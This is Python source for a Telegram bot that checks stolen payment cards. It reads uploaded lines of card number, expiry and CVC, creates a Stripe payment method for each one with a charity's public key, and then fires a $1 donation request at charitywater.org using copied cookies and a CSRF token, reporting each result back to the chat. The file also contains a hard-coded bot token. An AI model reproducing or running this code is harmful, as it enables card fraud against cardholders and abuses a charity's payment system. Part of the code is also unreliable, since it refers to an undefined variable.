import telebot
import requests
import time
from keep_alive import keep_alive
API_TOKEN = '7095759793:AAGQ2fvAThfUHkSDARdSLOwPiWylqD-Khig'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please use the /sd command to send the card file.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('text.txt', 'wb') as new_file:
            new_file.write(downloaded_file)
        
        bot.reply_to(message, "File received and processing started.")
        process_cards(message.chat.id)
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def process_cards(chat_id):
    try:
        with open('text.txt', 'r') as card_file:
            start_num = 0
            for line in card_file:
                start_num += 1
                ccx = line.strip()
                n = ccx.split("|")[0]
                mm = ccx.split("|")[1]
                yy = ccx.split("|")[2]
                cvc = ccx.split("|")[3]

                if "20" in yy:
                    yy = yy.split("20")[1]

                send_card(chat_id, n, mm, yy, cvc)
                time.sleep(5)

    except Exception as e:
        bot.send_message(chat_id, f"Error processing cards: {str(e)}")

def send_card(chat_id, n, mm, yy, cvc):
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&billing_details[address][postal_code]=10081&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=Dexter&billing_details[email]=dexterffxservices%40gmail.com&billing_details[name]=Dexter++Peo&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ced01066-6831-4584-a3d7-4dabadeb4e982cf541&muid=d3a5695e-440b-471c-8680-4c1507afd2fabfc7e4&sid=3a92f644-b6e6-46b0-9051-9308ce3a340ff4d016&payment_user_agent=stripe.js%2F0b2916fc28%3B+stripe-js-v3%2F0b2916fc28%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=181919&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    if response.status_code == 200:
        json_response = response.json()
        
        if 'id' in json_response:
            payment_id = json_response['id']
            
            start_time = time.time()

            cookies = {
    'countrypreference': 'US',
    'optimizelyEndUserId': 'oeu1727793859642r0.8180756511751737',
    'builderSessionId': 'e5b58574d8eb453a8748d8f6da8ff2e9',
    '_gcl_au': '1.1.596738504.1727793862',
    '_fbp': 'fb.1.1727793864846.611772960485636009',
    'IR_gbd': 'charitywater.org',
    'IR_16318': '1727793864575%7C0%7C1727793864575%7C%7C',
    'tatari-cookie-test': '85630455',
    't-ip': '1',
    'tatari-session-cookie': '2de9b794-8924-c5fa-f48f-b5ab67d0eb54',
    '_tt_enable_cookie': '1',
    '_ttp': 'gxWgmO_wPMheFXTQg2QhvBTinc1',
    '_ga': 'GA1.1.838495447.1727793867',
    'FPAU': '1.1.596738504.1727793862',
    'stripe_mid': 'd3a5695e-440b-471c-8680-4c1507afd2fabfc7e4',
    'stripe_sid': '3a92f644-b6e6-46b0-9051-9308ce3a340ff4d016',
    '_ga_5H0VND0XMD': 'GS1.1.1727793904.1.0.1727793904.0.0.609224386',
    '_uetsid': 'a7acbfa0800311ef87bb4feddcba704e',
    '_uetvid': 'a7adb9d0800311ef94c90b1d9bc25c7d',
    '_ga_SKG6MDYX1T': 'GS1.1.1727793864.1.1.1727794048.0.0.1115674906',
}

            headers = {
    'authority': 'www.charitywater.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.charitywater.org',
    'referer': 'https://www.charitywater.org/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-csrf-token': 'sgKsadhH3yWv3qHpUcyn2Avbssx-Mmx9AWQv-CIuNafN8EjidCgvxtebWinPii4l3s4b0wJ8nzb_jPtg0BXYdQ',
    'x-requested-with': 'XMLHttpRequest',
}

            data = {
    'country': 'us',
    'payment_intent[email]': 'dexterffxservices@gmail.com',
    'payment_intent[amount]': '1',
    'payment_intent[currency]': 'usd',
    'payment_intent[payment_method]': payment_id,
    'payment_intent[setup_future_usage]': 'off_session',
    'disable_existing_subscription_check': 'false',
    'donation_form[amount]': '1',
    'donation_form[comment]': '',
    'donation_form[display_name]': '',
    'donation_form[email]': 'dexterffxservices@gmail.com',
    'donation_form[name]': 'Dexter ',
    'donation_form[payment_gateway_token]': '',
    'donation_form[payment_monthly_subscription]': 'false',
    'donation_form[surname]': 'Peo',
    'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
    'donation_form[setup_intent_id]': '',
    'donation_form[subscription_period]': '',
    'donation_form[metadata][automatically_subscribe_to_mailing_lists]': 'true',
    'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
    'donation_form[metadata][phone_number]': '',
    'donation_form[metadata][plaid_account_id]': '',
    'donation_form[metadata][plaid_public_token]': '',
    'donation_form[metadata][url_params][touch_type]': '1',
    'donation_form[metadata][session_url_params][touch_type]': '1',
    'donation_form[metadata][with_saved_payment]': 'false',
    'donation_form[address][address_line_1]': 'Dexter',
    'donation_form[address][address_line_2]': '',
    'donation_form[address][city]': 'New York',
    'donation_form[address][country]': '',
    'donation_form[address][zip]': '10081',
}

            stripe_response = requests.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)
            elapsed_time = time.time() - start_time

            final_message = (
                f"𝗖𝗮𝗿𝗱: {card}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Donation 1$\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {stripe_response.text}\n"
                f"Payment Id : {payment_id}\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f} seconds"
            )
            bot.send_message(chat_id, final_message)
        else:
            bot.send_message(chat_id, "Error: No payment_id found in the response.")
    else:
        bot.send_message(chat_id, "Error: Failed to connect to the API.")
keep_alive()
bot.polling()
